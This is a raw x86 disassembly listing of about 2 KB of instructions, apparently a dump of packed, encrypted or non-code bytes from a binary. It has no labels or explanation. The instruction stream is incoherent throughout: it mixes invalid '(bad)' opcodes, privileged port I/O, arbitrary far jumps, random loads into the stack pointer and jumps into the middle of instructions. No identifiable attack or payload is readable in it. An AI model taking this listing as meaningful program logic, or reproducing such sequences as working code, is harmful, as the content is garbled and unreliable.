  40c32c:	in     eax,dx
  40c32d:	adc    al,0x8
  40c32f:	inc    eax
  40c330:	sub    dl,BYTE PTR [ecx+0x59]
  40c333:	mov    ds:0x7024aca8,eax
  40c338:	mov    bl,0x31
  40c33a:	test   DWORD PTR [ebp+0x491d7eea],edi
  40c340:	mov    edi,0xb1c9c84
  40c345:	leave  
  40c346:	sbb    bh,ch
  40c348:	mov    ecx,esi
  40c34a:	xor    eax,0x2053d531
  40c34f:	xor    BYTE PTR [ecx+edx*8+0x60],bl
  40c353:	lock adc ch,BYTE PTR [eax-0x3247a027]
  40c35a:	gs stc 
  40c35c:	mov    esp,0xeda4e5b0
  40c361:	adc    eax,0xe0a69f38
  40c366:	inc    edi
  40c367:	mov    ss,WORD PTR [esi+0x51463d19]
  40c36d:	sub    cl,BYTE PTR [eax-0x7af25179]
  40c373:	or     al,dl
  40c375:	or     DWORD PTR [eax-0x136d01b7],0x3687ae72
  40c37f:	shl    BYTE PTR [ebx],1
  40c381:	add    bl,BYTE PTR [ebx-0x22]
  40c384:	xchg   ebx,eax
  40c385:	and    DWORD PTR [esi+ebx*8+0x61],edx
  40c389:	out    dx,al
  40c38a:	adc    ecx,DWORD PTR ds:0xec1df04d
  40c390:	mov    ds:0x80b5cec0,eax
  40c395:	ds xchg edx,eax
  40c397:	pop    eax
  40c398:	or     al,0x50
  40c39a:	dec    eax
  40c39b:	push   esp
  40c39c:	inc    edi
  40c39d:	cdq    
  40c39e:	mov    cl,0x4e
  40c3a0:	push   ebx
  40c3a1:	repz enter 0xc849,0xe0
  40c3a6:	add    cl,BYTE PTR [edi+0x736fe4ff]
  40c3ac:	test   DWORD PTR [edx-0x6c0f0e3c],edi
  40c3b2:	rol    DWORD PTR [ecx+edi*8],1
  40c3b5:	cmc    
  40c3b6:	inc    edx
  40c3b7:	mov    dh,0x8e
  40c3b9:	lods   eax,DWORD PTR ds:[esi]
  40c3ba:	dec    edi
  40c3bb:	mov    al,ds:0xd28dc127
  40c3c0:	xchg   edi,eax
  40c3c1:	(bad)  
  40c3c3:	jge    0x40c3b2
  40c3c5:	sbb    BYTE PTR [ebp+0x79],dh
  40c3c8:	lock cmp al,0x3c
  40c3cb:	mov    eax,es:0xcf111ebd
  40c3d1:	adc    ebp,DWORD PTR [edx-0x57d662e6]
  40c3d7:	js     0x40c3d3
  40c3d9:	cli    
  40c3da:	mov    bl,0x75
  40c3dc:	add    ch,BYTE PTR [ecx-0x51]
  40c3df:	popa   
  40c3e0:	mov    esi,0x31749b8e
  40c3e5:	adc    al,0x9e
  40c3e7:	jle    0x40c387
  40c3e9:	mov    ah,bl
  40c3eb:	aam    0x83
  40c3ed:	aad    0x69
  40c3ef:	ja     0x40c45b
  40c3f1:	test   eax,0xe9f04e9d
  40c3f6:	push   esp
  40c3f7:	mov    esi,0x38270f3b
  40c3fc:	adc    ecx,DWORD PTR [eax+0x26]
  40c3ff:	(bad)  
  40c400:	jmp    FWORD PTR [ecx+0xa]
  40c403:	mov    dh,0x8b
  40c405:	xchg   ebx,eax
  40c406:	das    
  40c407:	fwait
  40c408:	cmc    
  40c409:	cmp    eax,0x599c9264
  40c40e:	shl    DWORD PTR cs:[ecx-0x4f5b2c0b],0x8b
  40c416:	popa   
  40c417:	add    BYTE PTR [edx+0x509ed125],dh
  40c41d:	fwait
  40c41e:	clc    
  40c41f:	adc    esp,edx
  40c421:	idiv   ah
  40c423:	loopne 0x40c3f1
  40c425:	mov    bh,0x6a
  40c427:	sub    bl,ah
  40c429:	(bad)
  40c42c:	inc    edx
  40c42d:	out    0xcd,eax
  40c42f:	sub    dl,dl
  40c431:	stos   BYTE PTR es:[edi],al
  40c432:	sub    edi,ebp
  40c434:	push   edx
  40c435:	jg     0x40c472
  40c437:	into   
  40c438:	mov    al,BYTE PTR [edx-0x371f0a3d]
  40c43e:	adc    dl,dl
  40c440:	jns    0x40c427
  40c442:	push   ebp
  40c443:	pusha  
  40c444:	jp     0x40c421
  40c446:	mov    ch,0x84
  40c448:	inc    eax
  40c449:	adc    BYTE PTR [edx],al
  40c44b:	xchg   ecx,eax
  40c44c:	lock retf 0x7c40
  40c450:	stos   DWORD PTR es:[edi],eax
  40c451:	push   cs
  40c452:	cdq    
  40c453:	push   ebx
  40c454:	imul   ebx,DWORD PTR [edx-0x6fecc1f5],0x64
  40c45b:	pop    ebx
  40c45c:	cmp    DWORD PTR es:[edx-0xf],edi
  40c460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c461:	rol    ebp,0xa5
  40c464:	inc    eax
  40c465:	sub    DWORD PTR gs:[esi-0x72],0x56
  40c46a:	daa    
  40c46b:	inc    ebx
  40c46c:	test   BYTE PTR [edx+ecx*4+0x40],dh
  40c470:	mov    dl,0x6d
  40c472:	loopne 0x40c401
  40c474:	push   ebx
  40c475:	ss sub ah,dl
  40c478:	dec    ecx
  40c479:	add    DWORD PTR [ebp-0x59],eax
  40c47c:	pextrw edi,(bad),0xc5
  40c47e:	jl     0x40c438
  40c480:	je     0x40c4c5
  40c482:	sbb    al,0x3
  40c484:	jb     0x40c4da
  40c486:	push   edx
  40c487:	test   eax,0xce249341
  40c48c:	cmp    eax,eax
  40c48e:	and    DWORD PTR [eax-0x21],ebx
  40c491:	shl    cl,1
  40c493:	(bad)  
  40c494:	stc    
  40c495:	out    0x9e,eax
  40c497:	out    dx,eax
  40c498:	or     ebx,esi
  40c49a:	rcl    cl,1
  40c49c:	jbe    0x40c48f
  40c49e:	add    DWORD PTR [ebx-0xf18f20a],ebx
  40c4a4:	mov    al,0xf1
  40c4a6:	add    ch,BYTE PTR [ecx-0x714da08d]
  40c4ac:	ret    0x778c
  40c4af:	ret    0xd437
  40c4b2:	sub    DWORD PTR ds:0xe7be4704,esi
  40c4b8:	fdivp  st(1),st
  40c4ba:	iret   
  40c4bb:	mov    al,ds:0xa2db6b36
  40c4c0:	push   DWORD PTR [ebp+0x7b2d39d4]
  40c4c6:	call   0x1d122efa
  40c4cb:	mov    WORD PTR [edx],cs
  40c4cd:	std    
  40c4ce:	adc    cl,BYTE PTR [ecx+ecx*8+0x62eb8457]
  40c4d5:	jmp    0x40c524
  40c4d7:	mov    esi,DWORD PTR [edi+ebx*2+0x2a359043]
  40c4de:	xor    eax,0x5a3b813
  40c4e3:	cmp    eax,DWORD PTR [esi+0x295e3d7]
  40c4e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4ea:	inc    ebx
  40c4eb:	xchg   esp,eax
  40c4ec:	mov    dh,0xe
  40c4ee:	jne    0x40c4b0
  40c4f0:	inc    esp
  40c4f1:	xor    dh,BYTE PTR [esi-0x94d2df5]
  40c4f7:	shr    cl,1
  40c4f9:	cmp    dl,0x62
  40c4fc:	inc    ebp
  40c4fd:	jecxz  0x40c547
  40c4ff:	inc    esi
  40c500:	inc    ebp
  40c501:	std    
  40c502:	mov    bh,0xa0
  40c504:	adc    BYTE PTR [ebx+0x536cc877],ch
  40c50a:	adc    al,0xed
  40c50c:	jmp    0x24a53f59
  40c511:	outs   dx,BYTE PTR ds:[esi]
  40c512:	mov    eax,ds:0xb16c2d63
  40c517:	mov    eax,ds:0x1be8308
  40c51c:	mov    edx,gs
  40c51e:	or     ecx,DWORD PTR [ecx-0x6c]
  40c521:	inc    esp
  40c522:	mov    bh,0xea
  40c524:	push   0x7099d4c9
  40c529:	shl    BYTE PTR [ecx-0x45],cl
  40c52c:	cmovae edx,DWORD PTR fs:[ecx]
  40c530:	or     eax,0x59342685
  40c535:	out    dx,al
  40c536:	mov    ch,0x6c
  40c538:	mov    DWORD PTR [ecx],ecx
  40c53a:	push   esi
  40c53b:	jbe    0x40c4e4
  40c53d:	jecxz  0x40c572
  40c53f:	pop    edi
  40c540:	jmp    0x40c559
  40c542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c543:	pop    es
  40c544:	cmp    cl,BYTE PTR [eax+0x623a5d0d]
  40c54a:	adc    bh,bl
  40c54c:	dec    ebp
  40c54d:	inc    ecx
  40c54e:	push   0x938d5b3e
  40c553:	inc    eax
  40c554:	or     eax,0xa1726c5b
  40c559:	xchg   esp,eax
  40c55a:	dec    esp
  40c55b:	gs enter 0x8181,0x76
  40c560:	add    esi,DWORD PTR [ecx+ebp*1-0x5e]
  40c564:	pop    es
  40c565:	bswap  esp
  40c567:	leave  
  40c568:	sbb    DWORD PTR [ebx+0x3458880a],esp
  40c56e:	arpl   WORD PTR [esi],bx
  40c570:	loopne 0x40c5ba
  40c572:	sbb    dh,bl
  40c574:	push   eax
  40c575:	rcr    BYTE PTR [ebx+0x9],0xde
  40c579:	jecxz  0x40c51f
  40c57b:	mov    cl,0x71
  40c57d:	sub    DWORD PTR [edi-0x40c19cb4],ebx
  40c583:	mov    eax,ds:0x8618f68f
  40c588:	stc    
  40c589:	jno    0x40c51a
  40c58b:	stos   DWORD PTR es:[edi],eax
  40c58c:	test   eax,0xce4c631f
  40c591:	scas   eax,DWORD PTR es:[edi]
  40c592:	not    bl
  40c594:	icebp  
  40c595:	sub    al,0xb8
  40c597:	adc    ch,BYTE PTR [eax]
  40c599:	push   eax
  40c59a:	(bad)  
  40c59b:	div    DWORD PTR [ebp+0x41]
  40c59e:	mov    al,0x3f
  40c5a0:	pop    eax
  40c5a1:	jg     0x40c58f
  40c5a3:	outs   dx,DWORD PTR ds:[esi]
  40c5a4:	xlat   BYTE PTR ds:[ebx]
  40c5a5:	sub    bh,BYTE PTR [eax]
  40c5a7:	mov    esp,0x6215d08e
  40c5ac:	cwde   
  40c5ad:	dec    edx
  40c5ae:	sub    al,BYTE PTR ds:0x2a430e53
  40c5b4:	add    BYTE PTR [edi+eax*1],bl
  40c5b7:	mov    dl,0x9e
  40c5b9:	cwde   
  40c5ba:	cmp    dh,0xfe
  40c5bd:	ds leave 
  40c5bf:	push   cs
  40c5c0:	inc    ecx
  40c5c1:	mov    ds:0x88b85f10,eax
  40c5c6:	push   0x7
  40c5c8:	enter  0xe68c,0xc5
  40c5cc:	popf   
  40c5cd:	jne    0x40c58e
  40c5cf:	jge    0x40c60f
  40c5d1:	cmp    eax,0xc0d9bc62
  40c5d6:	aam    0x9d
  40c5d8:	retf   
  40c5d9:	pop    eax
  40c5da:	(bad)  
  40c5dc:	jg     0x40c565
  40c5de:	jbe    0x40c5d7
  40c5e0:	stos   BYTE PTR es:[edi],al
  40c5e1:	std    
  40c5e2:	icebp  
  40c5e3:	cvttps2pi mm7,QWORD PTR [esi-0x49]
  40c5e7:	inc    esi
  40c5e8:	mov    ds:0x7bf93cbb,al
  40c5ed:	cmc    
  40c5ee:	daa    
  40c5ef:	mov    esp,0x6b893053
  40c5f4:	jl     0x40c5d6
  40c5f6:	aaa    
  40c5f7:	jp     0x40c613
  40c5f9:	push   es
  40c5fa:	pop    edi
  40c5fb:	in     eax,0xab
  40c5fd:	mov    esi,0xc718782
  40c602:	in     eax,dx
  40c603:	sub    BYTE PTR [eax],al
  40c605:	sub    eax,0x468a238d
  40c60a:	test   al,0x7a
  40c60c:	pop    es
  40c60d:	ror    BYTE PTR [ecx+0x15ac51eb],cl
  40c613:	aad    0x2e
  40c615:	imul   edi,DWORD PTR [ebx+0x76],0x2bb36cff
  40c61c:	push   edx
  40c61d:	or     eax,0xf9ab6f96
  40c622:	dec    ebp
  40c623:	cwde   
  40c624:	cmp    ecx,edx
  40c626:	fwait
  40c627:	jle    0x40c669
  40c629:	adc    al,0x86
  40c62b:	and    ah,BYTE PTR [ecx-0x2332f763]
  40c631:	ret    0xa586
  40c634:	icebp  
  40c635:	sar    cl,1
  40c637:	dec    ecx
  40c638:	mov    dh,BYTE PTR [ebp+0x60]
  40c63b:	daa    
  40c63c:	repz xchg esp,eax
  40c63e:	lock adc eax,0xedfa2635
  40c644:	cmp    DWORD PTR [ebx-0x26],0x51
  40c648:	repz loopne 0x40c6c3
  40c64b:	mov    al,ds:0x16acbe6f
  40c651:	sti    
  40c652:	imul   esi,ecx,0xffffffdd
  40c655:	fcom   st(1)
  40c657:	xchg   edx,eax
  40c658:	xchg   ecx,eax
  40c659:	dec    ecx
  40c65a:	xor    ebp,DWORD PTR [edi]
  40c65c:	daa    
  40c65d:	es test al,0xba
  40c660:	ds out dx,eax
  40c662:	in     al,dx
  40c663:	sub    ah,BYTE PTR [ebp-0x2c]
  40c666:	mov    al,ds:0xe6f1782
  40c66b:	mov    edi,0x2088c8c3
  40c670:	sub    DWORD PTR [edi],ebp
  40c672:	cmp    eax,0x60728c2e
  40c677:	adc    ebp,DWORD PTR [ecx+ecx*8-0x72]
  40c67b:	cld    
  40c67c:	or     eax,0xf0dc57b5
  40c681:	xor    DWORD PTR [esi],0xffffff96
  40c684:	pop    DWORD PTR ds:0x4587233b
  40c68a:	inc    edx
  40c68b:	jle    0x40c673
  40c68d:	(bad)  
  40c68e:	mov    ebp,0x3999b7ef
  40c693:	xchg   ebx,eax
  40c694:	fst    QWORD PTR [esi]
  40c696:	mov    al,0x45
  40c698:	fist   WORD PTR [ecx]
  40c69a:	out    0x9d,al
  40c69c:	sub    BYTE PTR [eax+0x17c8cb37],bh
  40c6a2:	mov    dh,0x81
  40c6a4:	rcl    BYTE PTR [edx],0xc2
  40c6a7:	(bad)
  40c6aa:	mov    eax,0x26471aa2
  40c6af:	icebp  
  40c6b0:	call   0x4ec0:0xf486da1c
  40c6b7:	dec    ebp
  40c6b8:	push   ebp
  40c6b9:	cmc    
  40c6ba:	adc    edx,DWORD PTR [esi+0x3c3200cf]
  40c6c0:	adc    dl,BYTE PTR [edx]
  40c6c2:	cli    
  40c6c3:	jge    0x40c673
  40c6c5:	and    dl,dh
  40c6c7:	add    dh,BYTE PTR [ebp-0x13e7cdec]
  40c6cd:	xchg   BYTE PTR ds:0x5c093a18,ch
  40c6d3:	in     al,dx
  40c6d4:	in     eax,0x52
  40c6d6:	mov    ebp,0xb134f0b9
  40c6db:	push   esp
  40c6dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6dd:	clc    
  40c6de:	stos   BYTE PTR es:[edi],al
  40c6df:	mov    esp,0x285973b1
  40c6e4:	mov    dh,BYTE PTR [ecx+0x90e9326]
  40c6ea:	mov    eax,ds:0x569ccd66
  40c6ef:	enter  0x652b,0x54
  40c6f3:	dec    ebx
  40c6f4:	mov    ah,0xaf
  40c6f6:	addr16 or dl,cl
  40c6f9:	loopne 0x40c6d6
  40c6fb:	and    eax,0xcc6ff0c9
  40c700:	adc    eax,0xbe0d257d
  40c705:	mov    DWORD PTR [esi],edi
  40c707:	retf   
  40c708:	pop    ds
  40c709:	jnp    0x40c781
  40c70b:	mov    ebx,DWORD PTR [ecx]
  40c70d:	cmp    BYTE PTR [edi],dl
  40c70f:	xor    BYTE PTR ds:0xc11c141b,dl
  40c715:	pop    esp
  40c716:	mov    al,0x89
  40c718:	adc    ebx,DWORD PTR [edi+0x3e06e49d]
  40c71e:	dec    esp
  40c71f:	lock add al,0xb
  40c722:	rcr    DWORD PTR [edi-0x38967db],1
  40c728:	dec    edi
  40c729:	jmp    0x19c0:0xf001bdb7
  40c730:	sti    
  40c731:	and    BYTE PTR gs:[edx],dl
  40c734:	bsf    edx,DWORD PTR [ebp-0x25e90bad]
  40c73b:	cld    
  40c73c:	ja     0x40c6dd
  40c73e:	push   esp
  40c73f:	or     eax,0x436b3816
  40c744:	add    BYTE PTR [edx],bl
  40c746:	mov    ebx,0xefe5b29f
  40c74b:	test   al,0x73
  40c74d:	jno    0x40c6d3
  40c74f:	push   cs
  40c750:	test   dh,bh
  40c752:	xchg   esp,eax
  40c753:	sbb    DWORD PTR [ecx+0x6e7c7e6b],esi
  40c759:	imul   edi,ebx,0xde91d207
  40c75f:	sahf   
  40c760:	in     al,0xea
  40c762:	and    BYTE PTR [ebx-0x6a],dl
  40c765:	xchg   ebp,eax
  40c766:	ss adc eax,0x558a7f76
  40c76c:	imul   ebp,DWORD PTR [edx+0x10],0x79ba81c
  40c773:	int3   
  40c774:	sub    al,0xa8
  40c776:	mov    eax,0x184b81c4
  40c77b:	inc    dh
  40c77d:	dec    eax
  40c77e:	mov    al,ds:0x76db6979
  40c783:	or     eax,0x443c2df3
  40c788:	xor    al,0x48
  40c78a:	inc    edx
  40c78b:	sbb    BYTE PTR [esi+eax*1-0x7],bh
  40c78f:	scas   al,BYTE PTR es:[edi]
  40c790:	add    DWORD PTR [edx+0x11],esp
  40c793:	fcmovbe st,st(1)
  40c795:	adc    dl,BYTE PTR [edi-0x21bab5cd]
  40c79b:	push   ecx
  40c79c:	loope  0x40c7d6
  40c79e:	repz test eax,ebx
  40c7a1:	push   ecx
  40c7a2:	aad    0xaf
  40c7a4:	and    al,0xc6
  40c7a6:	aad    0xf6
  40c7a8:	pop    edx
  40c7a9:	xor    BYTE PTR [edx],al
  40c7ab:	ins    BYTE PTR es:[edi],dx
  40c7ac:	xchg   DWORD PTR [ebp-0x23016e07],edx
  40c7b2:	mov    eax,ds:0x3cceae8e
  40c7b7:	add    al,BYTE PTR [edx]
  40c7b9:	pop    esi
  40c7ba:	std    
  40c7bb:	in     al,dx
  40c7bc:	mov    edx,0xe09fc1c5
  40c7c1:	icebp  
  40c7c2:	sar    dh,0x9a
  40c7c5:	lods   al,BYTE PTR ds:[esi]
  40c7c6:	sbb    DWORD PTR [ebp+0x5a],0x61668ee4
  40c7cd:	fucomi st,st(0)
  40c7cf:	or     BYTE PTR es:[edx-0x4a],al
  40c7d3:	mov    dh,0x17
  40c7d5:	mov    edx,0x4450ca00
  40c7da:	bound  esi,QWORD PTR [ebx+ebp*8-0x62]
  40c7de:	lea    edi,[edi-0x47]
  40c7e1:	test   BYTE PTR [edi-0x3c54607f],0xbe
  40c7e8:	pop    esp
  40c7e9:	sub    DWORD PTR [ecx-0x47],ebp
  40c7ec:	ret    0xb76b
  40c7ef:	push   ebp
  40c7f0:	and    BYTE PTR [ebp+0x7d43e29d],0xbb
  40c7f7:	lahf   
  40c7f8:	gs or  al,0x7
  40c7fb:	jno    0x40c832
  40c7fd:	sub    BYTE PTR [ebp+0x7b],bh
  40c800:	xchg   ebx,eax
  40c801:	pop    edi
  40c802:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c803:	cwde   
  40c804:	out    0xb0,eax
  40c806:	mov    DWORD PTR [edx-0x1ec6aa8d],esi
  40c80c:	or     al,0x46
  40c80e:	mov    ecx,0xd00f1f4
  40c813:	ins    DWORD PTR es:[edi],dx
  40c814:	sub    eax,0x5f0339c0
  40c819:	cwde   
  40c81a:	leave  
  40c81b:	cmc    
  40c81c:	and    BYTE PTR [edi],dh
  40c81e:	and    al,0xbe
  40c820:	loop   0x40c7dd
  40c822:	cmp    BYTE PTR ds:0x7f9ddf0,0xda
  40c829:	data16 (bad) 
  40c82b:	sbb    dl,cl
  40c82d:	mov    al,ds:0xa86db33d
  40c832:	pop    esi
  40c833:	(bad)  
  40c834:	push   0x214e5d46
  40c839:	xor    edi,esp
  40c83b:	mov    WORD PTR [eax-0x6d],es
  40c83e:	inc    edx
  40c83f:	addr16 stc 
  40c841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c842:	ja     0x40c7c4
  40c844:	fldenv [ebx-0x52]
  40c847:	(bad)  
  40c848:	xlat   BYTE PTR ds:[ebx]
  40c849:	cwde   
  40c84a:	stc    
  40c84b:	mov    ch,BYTE PTR [edi]
  40c84d:	xchg   BYTE PTR [edx+esi*4+0x575e0ba],cl
  40c854:	mov    esi,0xf1a2190d
  40c859:	popa   
  40c85a:	sbb    al,bh
  40c85c:	sub    esp,DWORD PTR [eax]
  40c85e:	repnz cmp BYTE PTR [edx-0x1e],dl
  40c862:	cmp    WORD PTR [edi],ax
  40c865:	fbstp  TBYTE PTR [edi+0xb]
  40c868:	shl    DWORD PTR [edx],0x63
  40c86b:	adc    bh,ah
  40c86d:	sub    eax,0xed525d6c
  40c872:	push   esi
  40c873:	sub    DWORD PTR [edi+0xa6297f],esi
  40c879:	and    al,0xef
  40c87b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c87c:	(bad)  
  40c87d:	scas   eax,DWORD PTR es:[edi]
  40c87e:	mov    ebp,0x7ac8e6e6
  40c883:	jg     0x40c886
  40c885:	jns    0x40c896
  40c887:	jle    0x40c8da
  40c889:	push   esp
  40c88a:	mov    eax,0x2150cb66
  40c88f:	mov    eax,DWORD PTR [edi+0x1a]
  40c892:	or     eax,0x422f343c
  40c897:	xchg   BYTE PTR [esi],ah
  40c899:	or     esp,DWORD PTR [edi+ecx*1+0x54]
  40c89d:	add    eax,DWORD PTR [eax]
  40c89f:	out    dx,al
  40c8a0:	add    al,0x69
  40c8a2:	inc    ecx
  40c8a3:	rcl    BYTE PTR ds:0xe9c4bf27,0xbd
  40c8aa:	stc    
  40c8ab:	aaa    
  40c8ac:	mov    cl,0x2
  40c8ae:	int    0xa3
  40c8b0:	(bad)  
  40c8b1:	or     eax,0x68df8b07
  40c8b6:	mov    DWORD PTR [edi+eiz*8-0x4b],esi
  40c8ba:	jg     0x40c8f2
  40c8bc:	mov    cl,0xdc
  40c8be:	call   0xe3d8:0x648c59d0
  40c8c5:	stos   DWORD PTR es:[edi],eax
  40c8c6:	inc    ebp
  40c8c7:	ins    BYTE PTR es:[edi],dx
  40c8c8:	fistp  WORD PTR [edx-0x39dae667]
  40c8ce:	or     BYTE PTR [ecx],0x48
  40c8d1:	jg     0x40c86f
  40c8d3:	jnp    0x40c945
  40c8d5:	push   ds
  40c8d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8d7:	in     al,0x9b
  40c8d9:	bound  esp,QWORD PTR [esi+0x6f110993]
  40c8df:	cli    
  40c8e0:	cdq    
  40c8e1:	cmp    DWORD PTR [esi-0x384277d0],ecx
  40c8e7:	add    esp,eax
  40c8e9:	dec    ebp
  40c8ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8eb:	aaa    
  40c8ec:	ret    
  40c8ed:	xor    edx,DWORD PTR [ebx-0x6f]
  40c8f0:	sbb    esp,DWORD PTR [edi]
  40c8f2:	sub    al,0xa9
  40c8f4:	mov    eax,ds:0x3edf0098
  40c8f9:	arpl   WORD PTR [ebx],ax
  40c8fb:	dec    edx
  40c8fc:	call   0xc85d41d2
  40c901:	es leave 
  40c903:	mov    cl,0xce
  40c905:	adc    al,0xb9
  40c907:	mov    ds:0xdf1ac3ba,eax
  40c90c:	pop    eax
  40c90d:	rcr    DWORD PTR [ecx+edx*8+0x44916c9],1
  40c914:	sub    ebx,DWORD PTR [ebx+0x48]
  40c917:	mov    ds:0xdbcc4fa3,al
  40c91c:	mov    ecx,0xf26bfb45
  40c921:	adc    DWORD PTR [edx-0x4],edi
  40c924:	loop   0x40c978
  40c926:	jl     0x40c8e0
  40c928:	shl    DWORD PTR [ebp-0x6f],1
  40c92b:	jne    0x40c8bb
  40c92d:	fidiv  DWORD PTR [ebx+0x3ca6f877]
  40c933:	arpl   WORD PTR [ecx],si
  40c935:	cmp    eax,0x11dee79d
  40c93a:	les    ebp,FWORD PTR [ebp-0x40]
  40c93d:	adc    al,0x98
  40c93f:	fbld   TBYTE PTR [edx+0x5c47777]
  40c945:	adc    al,BYTE PTR [esi-0x27]
  40c948:	inc    esp
  40c949:	add    BYTE PTR [eax+0x4a],ah
  40c94c:	cdq    
  40c94d:	stos   BYTE PTR es:[edi],al
  40c94e:	adc    eax,0x6005c68b
  40c953:	out    0xa9,eax
  40c955:	cmp    BYTE PTR [ecx+ecx*8+0x33],0xa6
  40c95a:	sahf   
  40c95b:	js     0x40c958
  40c95d:	fcmovu st,st(3)
  40c95f:	inc    edi
  40c960:	push   esi
  40c961:	pop    ss
  40c962:	out    0x0,al
  40c964:	adc    eax,0xde6cd5b
  40c969:	loop   0x40c91d
  40c96b:	jns    0x40c9ab
  40c96d:	retf   
  40c96e:	into   
  40c96f:	pop    edx
  40c970:	into   
  40c971:	scas   eax,DWORD PTR es:[edi]
  40c972:	jmp    0x40c97c
  40c974:	mov    dl,0x9e
  40c976:	jns    0x40c94d
  40c978:	fsub   DWORD PTR [eax+0x39]
  40c97b:	jp     0x40c9ab
  40c97d:	shr    esi,1
  40c97f:	(bad)  
  40c980:	out    0xe9,eax
  40c982:	lods   eax,DWORD PTR ds:[esi]
  40c983:	test   BYTE PTR [ebx-0x63022a],ah
  40c989:	add    al,0x84
  40c98b:	in     al,0x9c
  40c98d:	cmp    esi,DWORD PTR [ebx+eax*8-0x5916e568]
  40c994:	mov    bl,0x7
  40c996:	pop    es
  40c997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c998:	in     al,0x97
  40c99a:	outs   dx,DWORD PTR ds:[esi]
  40c99b:	arpl   WORD PTR [edi-0x67717ba3],di
  40c9a1:	(bad)  
  40c9a2:	int3   
  40c9a3:	dec    esp
  40c9a4:	mov    eax,0xd74793d3
  40c9a9:	shr    DWORD PTR [esi+0x64],cl
  40c9ac:	adc    al,0xad
  40c9ae:	sub    DWORD PTR [esi-0x64],ebp
  40c9b1:	rcr    dh,cl
  40c9b3:	dec    edx
  40c9b4:	push   ebp
  40c9b5:	and    ax,0x9b4a
  40c9b9:	cmp    al,0x8c
  40c9bb:	ja     0x40c96b
  40c9bd:	jmp    0x56e3:0x8cbebf37
  40c9c4:	and    eax,0xe2ef5119
  40c9c9:	cmp    BYTE PTR [ebp-0x6f],0xeb
  40c9cd:	test   al,0xcc
  40c9cf:	lods   eax,DWORD PTR ds:[esi]
  40c9d0:	jmp    0x40ca0d
  40c9d2:	and    eax,0x18a2abad
  40c9d7:	daa    
  40c9d8:	cld    
  40c9d9:	ins    DWORD PTR es:[edi],dx
  40c9da:	mov    DWORD PTR [esi],0x3598498c
  40c9e0:	push   ds
  40c9e1:	mov    ch,0x58
  40c9e3:	stc    
  40c9e4:	push   0x9b4d3f9d
  40c9e9:	out    0xc3,al
  40c9eb:	leave  
  40c9ec:	and    eax,0x70d5f7a8
  40c9f1:	or     DWORD PTR [edi-0x44],edi
  40c9f4:	jp     0x40ca54
  40c9f6:	sbb    BYTE PTR [ecx],dh
  40c9f8:	lods   al,BYTE PTR ds:[esi]
  40c9f9:	pop    ebp
  40c9fa:	icebp  
  40c9fb:	(bad)  
  40c9fc:	mov    ds:0xcdd5bb1f,eax
  40ca01:	mov    dh,0xdd
  40ca03:	inc    edi
  40ca04:	ins    DWORD PTR es:[edi],dx
  40ca05:	or     bl,BYTE PTR gs:[esi+0x2ecc29a]
  40ca0c:	pop    edi
  40ca0d:	dec    edi
  40ca0e:	test   al,0x15
  40ca10:	iret   
  40ca11:	mov    ecx,0x500648e2
  40ca16:	inc    ebx
  40ca17:	mov    es,WORD PTR [ecx]
  40ca19:	imul   ebx,DWORD PTR [eax-0x48],0xffffffd4
  40ca1d:	shl    DWORD PTR ss:[ebp-0x35],cl
  40ca21:	popa   
  40ca22:	and    esi,0xffffff80
  40ca25:	imul   DWORD PTR [eax]
  40ca27:	dec    esi
  40ca28:	inc    edx
  40ca29:	mov    WORD PTR [esi-0x47],fs
  40ca2c:	add    ecx,edi
  40ca2e:	mov    edi,0xa7f1d368
  40ca33:	xchg   DWORD PTR [ebx],edx
  40ca35:	inc    eax
  40ca36:	pop    eax
  40ca37:	adc    dh,ah
  40ca39:	lods   eax,DWORD PTR ds:[esi]
  40ca3a:	mov    ecx,0x455e6b2a
  40ca3f:	and    esp,esi
  40ca41:	jmp    0x28b7:0x491a91ce
  40ca48:	adc    al,0x8e
  40ca4a:	cmp    esi,DWORD PTR [edi]
  40ca4c:	fwait
  40ca4d:	dec    ebp
  40ca4e:	pusha  
  40ca4f:	cmp    BYTE PTR ds:0xb32f1254,0xfc
  40ca56:	xchg   esp,ecx
  40ca58:	mov    esi,0x3003dd66
  40ca5d:	clc    
  40ca5e:	in     eax,0xc
  40ca60:	rcr    esp,0xcc
  40ca63:	fst    st(5)
  40ca65:	mov    ebx,0x69017d04
  40ca6a:	fisubr DWORD PTR [esi]
  40ca6c:	inc    edx
  40ca6d:	mov    ebp,0xdc7a63e1
  40ca72:	(bad)  
  40ca73:	mov    esi,0x8b319a2
  40ca78:	sub    al,0xd6
  40ca7a:	xchg   ecx,eax
  40ca7b:	push   cs
  40ca7c:	inc    edi
  40ca7d:	stos   BYTE PTR es:[edi],al
  40ca7e:	sbb    eax,DWORD PTR [esp+ecx*2]
  40ca81:	and    eax,0x9848a19a
  40ca86:	xchg   esp,eax
  40ca87:	int    0x95
  40ca89:	cmp    al,0xea
  40ca8b:	pop    esi
  40ca8c:	les    edi,FWORD PTR [esi-0x28]
  40ca8f:	stc    
  40ca90:	imul   edx,DWORD PTR [eax-0x19e856a2],0x1a
  40ca97:	mov    eax,ss
  40ca99:	iret   
  40ca9a:	pop    esi
  40ca9b:	mov    ah,0x65
  40ca9d:	and    eax,0xff15b1
  40caa2:	pop    ecx
  40caa3:	add    DWORD PTR [ecx],ebp
  40caa5:	sub    eax,0x36e18ad2
  40caaa:	outs   dx,BYTE PTR ds:[esi]
  40caab:	mov    ah,0xee
  40caad:	jae    0x40ca5e
  40caaf:	imul   ecx,DWORD PTR [ebx],0x7d
  40cab2:	or     esi,ecx
  40cab4:	mov    esi,0x5d1d6280
  40cab9:	leave  
  40caba:	pusha  
  40cabb:	and    esi,DWORD PTR [esp+eiz*2]
  40cabe:	leave  
  40cabf:	cli    
  40cac0:	jle    0x40cb34
  40cac2:	or     al,0x29
  40cac4:	repnz mov ebx,0xb9b86178
  40caca:	std    
  40cacb:	pop    ds
  40cacc:	sub    al,0x17
  40cace:	xchg   esi,eax
  40cacf:	out    dx,eax
  40cad0:	out    dx,al
  40cad1:	push   es
